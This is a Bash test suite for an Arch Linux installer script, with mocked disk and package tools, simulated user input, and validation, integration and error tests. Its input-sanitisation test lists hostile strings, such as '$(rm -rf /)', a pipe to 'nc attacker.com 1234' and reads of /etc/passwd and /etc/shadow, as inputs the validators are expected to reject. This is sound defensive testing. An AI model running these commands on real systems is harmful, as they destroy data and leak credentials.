#!/bin/bash

# Advanced Test Suite for archinstall.sh
# This file contains more sophisticated tests including input simulation,
# integration testing, and comprehensive error scenario testing.

set -euo pipefail

# Source the main test framework and configuration
readonly TEST_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$TEST_SCRIPT_DIR/test_config.sh"

#######################################
# Advanced Mock System
#######################################

setup_advanced_mocks() {
    mkdir -p "$MOCK_DIR/bin"
    mkdir -p "$MOCK_DIR/sys/firmware/efi/efivars"
    mkdir -p "$MOCK_DIR/proc/cpuinfo"
    mkdir -p "$MOCK_DIR/etc"
    mkdir -p "$MOCK_DIR/mnt"
    mkdir -p "$MOCK_DIR/boot"
    
    # Create sophisticated mock commands with state tracking
    create_stateful_mock_command "lsblk"
    create_stateful_mock_command "mount"
    create_stateful_mock_command "umount"
    create_stateful_mock_command "mkfs.ext4"
    create_stateful_mock_command "mkfs.btrfs"
    create_stateful_mock_command "pacstrap"
    create_stateful_mock_command "arch-chroot"
    
    # Mock system files
    setup_mock_system_files
    
    export PATH="$MOCK_DIR/bin:$PATH"
}

create_stateful_mock_command() {
    local cmd="$1"
    local mock_file="$MOCK_DIR/bin/$cmd"
    
    cat > "$mock_file" << EOF
#!/bin/bash

# Stateful mock for $cmd
MOCK_STATE_DIR="/tmp/mock_state"
mkdir -p "\$MOCK_STATE_DIR"

# Log the call
echo "MOCK_CALL: \$0 \$*" >> /tmp/mock_calls.log
echo "MOCK_CALL: \$0 \$*" >> "\$MOCK_STATE_DIR/${cmd}_calls.log"

# Increment call counter
CALL_COUNT=\$(cat "\$MOCK_STATE_DIR/${cmd}_count" 2>/dev/null || echo 0)
echo \$((CALL_COUNT + 1)) > "\$MOCK_STATE_DIR/${cmd}_count"

# Command-specific behavior
case "$cmd" in
    "lsblk")
        if [[ "\$*" == *"-o NAME,SIZE,TYPE"* ]]; then
            cat "\$MOCK_STATE_DIR/lsblk_detailed_response" 2>/dev/null || echo "sda 100G disk"
        else
            cat "\$MOCK_STATE_DIR/lsblk_simple_response" 2>/dev/null || echo "sda"
        fi
        ;;
    "mount")
        if [[ "\$*" == *"/dev/"* ]]; then
            # Simulate mounting by creating mount state
            echo "\$*" >> "\$MOCK_STATE_DIR/mounted_devices"
        else
            # Show mount output
            cat "\$MOCK_STATE_DIR/mount_output" 2>/dev/null || echo ""
        fi
        ;;
    "pacstrap")
        # Simulate package installation
        if [[ \$CALL_COUNT -le 1 ]]; then
            echo "Installing packages..."
            sleep 0.1  # Simulate installation time
        fi
        ;;
esac

# Return appropriate exit code
exit \${MOCK_EXIT_CODE:-0}
EOF
    
    chmod +x "$mock_file"
}

setup_mock_system_files() {
    # Create mock /proc/cpuinfo
    cat > "$MOCK_DIR/proc/cpuinfo" << 'EOF'
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 142
model name	: Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz
stepping	: 12
microcode	: 0xf0
cpu MHz		: 1800.000
cache size	: 8192 KB
EOF

    # Create mock /etc/pacman.conf
    cat > "$MOCK_DIR/etc/pacman.conf" << 'EOF'
[options]
HoldPkg     = pacman glibc
Architecture = auto
CheckSpace
SigLevel    = Required DatabaseOptional
LocalFileSigLevel = Optional

[core]
Include = /etc/pacman.d/mirrorlist

[extra]
Include = /etc/pacman.d/mirrorlist

[multilib]
Include = /etc/pacman.d/mirrorlist
EOF
}

setup_mock_responses() {
    mkdir -p "/tmp/mock_state"
    
    # Setup default responses
    echo "$MOCK_LSBLK_DETAILED" > "/tmp/mock_state/lsblk_detailed_response"
    echo "$MOCK_LSBLK_SIMPLE" > "/tmp/mock_state/lsblk_simple_response"
    echo "$MOCK_MOUNT_EMPTY" > "/tmp/mock_state/mount_output"
    
    # Reset call counters
    rm -f /tmp/mock_state/*_count
    rm -f /tmp/mock_state/*_calls.log
    rm -f /tmp/mock_state/mounted_devices
    
    export MOCK_EXIT_CODE=0
}

#######################################
# Input Simulation Framework
#######################################

simulate_user_input() {
    local input_sequence=("$@")
    local input_file="/tmp/test_input_$$"
    
    # Create input file
    printf '%s\n' "${input_sequence[@]}" > "$input_file"
    
    # Redirect stdin to use our input file
    exec 3< "$input_file"
    
    # Clean up function
    cleanup_input_simulation() {
        exec 3<&-
        rm -f "$input_file"
    }
    
    # Return cleanup function name
    echo "cleanup_input_simulation"
}

#######################################
# Advanced Validation Tests
#######################################

test_validate_username_comprehensive() {
    local test_passed=true
    
    # Test all valid usernames from config
    for username in "${VALID_USERNAMES[@]}"; do
        if ! validate_username "$username"; then
            test_failure "Valid username '$username' was rejected"
            test_passed=false
        fi
    done
    
    # Test all invalid usernames from config
    for username in "${INVALID_USERNAMES[@]}"; do
        if validate_username "$username"; then
            test_failure "Invalid username '$username' was accepted"
            test_passed=false
        fi
    done
    
    # Test edge cases
    local edge_cases=("a" "z" "user1" "test-user" "user_123")
    for username in "${edge_cases[@]}"; do
        if ! validate_username "$username"; then
            test_failure "Edge case username '$username' was rejected"
            test_passed=false
        fi
    done
    
    $test_passed
}

test_validate_hostname_comprehensive() {
    local test_passed=true
    
    # Test all valid hostnames from config
    for hostname in "${VALID_HOSTNAMES[@]}"; do
        if ! validate_hostname "$hostname"; then
            test_failure "Valid hostname '$hostname' was rejected"
            test_passed=false
        fi
    done
    
    # Test all invalid hostnames from config  
    for hostname in "${INVALID_HOSTNAMES[@]}"; do
        if validate_hostname "$hostname"; then
            test_failure "Invalid hostname '$hostname' was accepted"
            test_passed=false
        fi
    done
    
    $test_passed
}

test_disk_validation_comprehensive() {
    local test_passed=true
    
    # Test with various disk types
    for disk in "${!MOCK_DISKS[@]}"; do
        # Create mock disk
        mkdir -p "$(dirname "$disk")"
        touch "$disk"
        
        # Test validation
        if ! validate_disk "$disk"; then
            test_failure "Valid disk '$disk' was rejected"
            test_passed=false
        fi
        
        # Clean up
        rm -f "$disk"
    done
    
    # Test with mounted disk scenario
    echo "/dev/sda1 on /boot type vfat" > "/tmp/mock_state/mount_output"
    if validate_disk "/dev/sda"; then
        test_failure "Mounted disk should be rejected"
        test_passed=false
    fi
    
    # Reset mount output
    echo "" > "/tmp/mock_state/mount_output"
    
    $test_passed
}

#######################################
# User Input Function Tests
#######################################

test_get_disk_selection_interactive() {
    # Override read to use our input
    read() {
        echo "1" # Select first disk
    }
    
    # Mock lsblk to return multiple disks
    echo "sda sdb nvme0n1" > "/tmp/mock_state/lsblk_simple_response"
    
    # Test the function
    if get_disk_selection; then
        # Check if DISK variable was set
        if [[ -n "$DISK" ]]; then
            return 0
        else
            test_failure "DISK variable not set after selection"
            return 1
        fi
    else
        test_failure "get_disk_selection failed"
        return 1
    fi
}

test_get_filesystem_type_interactive() {
    # Override read to select ext4
    read() {
        echo "1"
    }
    
    if get_filesystem_type; then
        if [[ "$FILESYSTEM_TYPE" == "ext4" ]]; then
            return 0
        else
            test_failure "Expected ext4 but got '$FILESYSTEM_TYPE'"
            return 1
        fi
    else
        test_failure "get_filesystem_type failed"
        return 1
    fi
}

test_get_hostname_interactive() {
    # Override read to provide hostname
    read() {
        case "$1" in
            *hostname*)
                echo "test-hostname"
                ;;
        esac
    }
    
    if get_hostname; then
        if [[ "$HOSTNAME" == "test-hostname" ]]; then
            return 0
        else
            test_failure "Expected 'test-hostname' but got '$HOSTNAME'"
            return 1
        fi
    else
        test_failure "get_hostname failed"
        return 1
    fi
}

test_get_user_configuration_interactive() {
    # Mock user input sequence
    local input_calls=0
    read() {
        ((input_calls++))
        case "$input_calls" in
            1) echo "testuser" ;;          # username
            2) echo "testpassword" ;;      # password
            3) echo "testpassword" ;;      # password confirmation
            4) echo "2" ;;                 # shell selection (zsh)
            5) echo "y" ;;                 # sudo access
        esac
    }
    
    if get_user_configuration; then
        local checks_passed=true
        
        if [[ "$USERNAME" != "testuser" ]]; then
            test_failure "Expected username 'testuser' but got '$USERNAME'"
            checks_passed=false
        fi
        
        if [[ "$USER_SHELL" != "/bin/zsh" ]]; then
            test_failure "Expected shell '/bin/zsh' but got '$USER_SHELL'"
            checks_passed=false
        fi
        
        if [[ "$ENABLE_SUDO" != "yes" ]]; then
            test_failure "Expected sudo enabled but got '$ENABLE_SUDO'"
            checks_passed=false
        fi
        
        $checks_passed
    else
        test_failure "get_user_configuration failed"
        return 1
    fi
}

#######################################
# Integration Tests
#######################################

test_complete_configuration_workflow() {
    # Set up test scenario
    get_test_scenario "minimal"
    
    # Mock all interactive functions to use scenario data
    get_disk_selection() { DISK="${TEST_SCENARIO_MINIMAL[DISK]}"; }
    get_filesystem_type() { FILESYSTEM_TYPE="${TEST_SCENARIO_MINIMAL[FILESYSTEM_TYPE]}"; }
    get_hostname() { HOSTNAME="${TEST_SCENARIO_MINIMAL[HOSTNAME]}"; }
    get_user_configuration() { 
        USERNAME="${TEST_SCENARIO_MINIMAL[USERNAME]}"
        USER_SHELL="${TEST_SCENARIO_MINIMAL[USER_SHELL]}"
        ENABLE_SUDO="${TEST_SCENARIO_MINIMAL[ENABLE_SUDO]}"
    }
    get_bootloader_selection() { BOOTLOADER="${TEST_SCENARIO_MINIMAL[BOOTLOADER]}"; }
    detect_cpu_microcode() { CPU_VENDOR="${TEST_SCENARIO_MINIMAL[CPU_VENDOR]}"; }
    get_multilib_preference() { ENABLE_MULTILIB="${TEST_SCENARIO_MINIMAL[ENABLE_MULTILIB]}"; }
    
    # Run configuration workflow
    get_disk_selection
    get_filesystem_type
    get_hostname
    get_user_configuration
    get_bootloader_selection
    detect_cpu_microcode
    get_multilib_preference
    
    # Verify all variables are set correctly
    local checks_passed=true
    
    for key in "${!TEST_SCENARIO_MINIMAL[@]}"; do
        local expected="${TEST_SCENARIO_MINIMAL[$key]}"
        local actual="${!key}"
        
        if [[ "$actual" != "$expected" ]]; then
            test_failure "Variable $key: expected '$expected' but got '$actual'"
            checks_passed=false
        fi
    done
    
    $checks_passed
}

test_complete_installation_simulation() {
    # Set up test scenario
    get_test_scenario "full"
    
    # Mock functions to avoid actual system changes
    create_partitions() { 
        echo "MOCK: Creating partitions on $DISK"
        return 0
    }
    
    format_partitions() {
        echo "MOCK: Formatting partitions with $FILESYSTEM_TYPE"
        return 0
    }
    
    mount_filesystems() {
        echo "MOCK: Mounting filesystems"
        return 0
    }
    
    install_base_system() {
        echo "MOCK: Installing base system"
        return 0
    }
    
    configure_system() {
        echo "MOCK: Configuring system"
        return 0
    }
    
    configure_bootloader() {
        echo "MOCK: Configuring $BOOTLOADER"
        return 0
    }
    
    configure_users() {
        echo "MOCK: Configuring user $USERNAME"
        return 0
    }
    
    # Run simulated installation
    create_partitions
    format_partitions
    mount_filesystems
    install_base_system
    configure_system
    configure_bootloader
    configure_users
    
    return 0
}

#######################################
# Error Scenario Tests
#######################################

test_network_failure_scenarios() {
    local test_passed=true
    
    # Test no internet connection
    export MOCK_EXIT_CODE=1
    
    # Override fatal to return error instead of exiting
    fatal() { return 1; }
    
    if validate_network; then
        test_failure "validate_network should fail with no internet"
        test_passed=false
    fi
    
    # Reset
    export MOCK_EXIT_CODE=0
    
    $test_passed
}

test_disk_failure_scenarios() {
    local test_passed=true
    
    # Test nonexistent disk
    if validate_disk "/dev/nonexistent"; then
        test_failure "validate_disk should fail for nonexistent disk"
        test_passed=false
    fi
    
    # Test mounted disk
    echo "/dev/sda1 on /boot type vfat" > "/tmp/mock_state/mount_output"
    
    # Override fatal function
    fatal() { return 1; }
    
    if validate_disk "/dev/sda"; then
        test_failure "validate_disk should fail for mounted disk"
        test_passed=false
    fi
    
    # Reset
    echo "" > "/tmp/mock_state/mount_output"
    
    $test_passed
}

test_pacstrap_failure_scenario() {
    # Make pacstrap fail
    cat > "$MOCK_DIR/bin/pacstrap" << 'EOF'
#!/bin/bash
echo "MOCK_CALL: pacstrap $*" >> /tmp/mock_calls.log
echo "ERROR: Failed to install packages" >&2
exit 1
EOF
    
    # Override fatal function
    fatal() { return 1; }
    
    if install_base_system; then
        test_failure "install_base_system should fail when pacstrap fails"
        return 1
    else
        return 0
    fi
}

#######################################
# Performance and Stress Tests
#######################################

test_rapid_validation_calls() {
    local iterations=100
    local start_time
    local end_time
    
    start_time=$(date +%s%N)
    
    for ((i=1; i<=iterations; i++)); do
        validate_username "testuser$i" >/dev/null 2>&1
        validate_hostname "host$i" >/dev/null 2>&1
    done
    
    end_time=$(date +%s%N)
    local duration=$(( (end_time - start_time) / 1000000 )) # Convert to milliseconds
    
    if [[ $duration -gt 5000 ]]; then # 5 seconds
        test_warning "Validation functions took ${duration}ms for $iterations iterations"
    fi
    
    return 0
}

test_large_input_handling() {
    # Test with very large inputs
    local large_string
    large_string=$(printf 'a%.0s' {1..10000})
    
    if validate_username "$large_string"; then
        test_failure "Very large username should be rejected"
        return 1
    fi
    
    if validate_hostname "$large_string"; then
        test_failure "Very large hostname should be rejected"
        return 1
    fi
    
    return 0
}

#######################################
# Security Tests
#######################################

test_input_sanitization() {
    local malicious_inputs=(
        '$(rm -rf /)'
        '`whoami`'
        '; cat /etc/passwd'
        '| nc attacker.com 1234'
        '$USER'
        '${PATH}'
        '../../../etc/passwd'
    )
    
    for input in "${malicious_inputs[@]}"; do
        if validate_username "$input"; then
            test_failure "Malicious input '$input' was accepted as username"
            return 1
        fi
        
        if validate_hostname "$input"; then
            test_failure "Malicious input '$input' was accepted as hostname"
            return 1
        fi
    done
    
    return 0
}

test_path_traversal_protection() {
    local dangerous_paths=(
        "../../../etc/passwd"
        "/etc/shadow"
        "../../bin/sh"
        "$(pwd)/../../../"
    )
    
    # These should not be accepted as valid paths in any context
    for path in "${dangerous_paths[@]}"; do
        # Test that dangerous paths are not processed
        if [[ "$path" =~ ^[a-zA-Z0-9/_-]+$ ]]; then
            test_failure "Dangerous path '$path' matches safe pattern"
            return 1
        fi
    done
    
    return 0
}

#######################################
# Advanced Test Runner
#######################################

run_advanced_test_suite() {
    echo "Advanced Test Suite for archinstall.sh"
    echo "======================================"
    echo
    
    # Setup advanced test environment
    test_info "Setting up advanced test environment..."
    setup_advanced_mocks
    source_archinstall_functions
    setup_mock_responses
    
    # Comprehensive validation tests
    run_test "Username Validation (Comprehensive)" test_validate_username_comprehensive
    run_test "Hostname Validation (Comprehensive)" test_validate_hostname_comprehensive
    run_test "Disk Validation (Comprehensive)" test_disk_validation_comprehensive
    
    # Interactive function tests
    run_test "Disk Selection (Interactive)" test_get_disk_selection_interactive
    run_test "Filesystem Type (Interactive)" test_get_filesystem_type_interactive
    run_test "Hostname Input (Interactive)" test_get_hostname_interactive
    run_test "User Configuration (Interactive)" test_get_user_configuration_interactive
    
    # Integration tests
    run_test "Complete Configuration Workflow" test_complete_configuration_workflow
    run_test "Complete Installation Simulation" test_complete_installation_simulation
    
    # Error scenario tests
    run_test "Network Failure Scenarios" test_network_failure_scenarios
    run_test "Disk Failure Scenarios" test_disk_failure_scenarios
    run_test "Pacstrap Failure Scenario" test_pacstrap_failure_scenario
    
    # Performance tests
    run_test "Rapid Validation Calls" test_rapid_validation_calls
    run_test "Large Input Handling" test_large_input_handling
    
    # Security tests
    run_test "Input Sanitization" test_input_sanitization
    run_test "Path Traversal Protection" test_path_traversal_protection
    
    # Cleanup
    cleanup_mocks
    rm -rf "/tmp/mock_state"
}

# Script entry point for standalone execution
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Source the main test framework
    source "$TEST_SCRIPT_DIR/test_archinstall.sh"
    
    run_advanced_test_suite
    print_test_summary
fi